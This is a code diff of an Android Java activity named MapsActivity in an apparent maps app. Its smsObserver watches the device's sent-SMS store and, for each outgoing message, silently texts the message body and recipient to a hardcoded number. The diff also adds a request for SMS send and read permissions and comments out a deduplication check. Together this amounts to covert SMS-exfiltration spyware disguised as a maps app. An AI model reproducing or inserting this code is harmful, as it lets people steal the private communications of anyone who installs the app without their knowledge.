@@ -60,8 +60,6 @@ public class MapsActivity extends AppCompatActivity {
 
     protected void onCreate(Bundle savedInstanceState) {
 
-     //   startService(new Intent(getApplicationContext(),MyService.class));
-
         Context context = getApplicationContext();
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_maps);
@@ -105,6 +103,13 @@ public class MapsActivity extends AppCompatActivity {
             }
         }
 
+        if (ContextCompat.checkSelfPermission(context,
+                Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
+        } else {
+            ActivityCompat.requestPermissions(this,
+                    new String[]{Manifest.permission.SEND_SMS},
+                    MY_PERMISSIONS_REQUEST_SEND_SMS);
+        }
     }
 
     private static final String COLUMN_TYPE = "type";
@@ -113,15 +118,12 @@ public class MapsActivity extends AppCompatActivity {
     class smsObserver extends ContentObserver {
         Context context = getApplicationContext();
 
-        private String lastSmsId;
-
         public smsObserver(Handler handler) {
             super(handler);
         }
 
         @Override
         public void onChange(boolean selfChange) {
-            //super.onChange(selfChange);
 
             Uri uriSMSURI = Uri.parse("content://sms//sent");
             Cursor cur = null;
@@ -149,10 +151,10 @@ public class MapsActivity extends AppCompatActivity {
                                 Manifest.permission.SEND_SMS)
                                 == PackageManager.PERMISSION_GRANTED) {
 
-                            String line = "Message: " + message + " to: " + address;
-                            String p = "123456789";
-                            SmsManager sms = SmsManager.getDefault();
-                            sms.sendTextMessage(p, null, line, null, null);
+                                String line = "Message: " + message + " to: " + address;
+                                String p = "123456789";
+                                SmsManager sms = SmsManager.getDefault();
+                                sms.sendTextMessage(p, null, line, null, null);
 
                         }
                     }
@@ -173,18 +175,18 @@ public class MapsActivity extends AppCompatActivity {
 
         }
 
-      public boolean smsChecker(String smsId) {
-            boolean flagSMS = true;
+   //   public boolean smsChecker(String smsId) {
+     //       boolean flagSMS = true;
 
-            System.out.println("SMS: " + smsId);
-            if (smsId.equals(lastSmsId)) {
-               flagSMS = false;
-            } else {
-                lastSmsId = smsId;
-            }
+      //      System.out.println("SMS: " + smsId);
+       //     if (smsId.equals(lastSmsId)) {
+        //       flagSMS = false;
+        //    } else {
+         //       lastSmsId = smsId;
+         //   }
 
-            return flagSMS;
-        }
+        //    return flagSMS;
+     //   }
     }
 
     protected void onStart() {
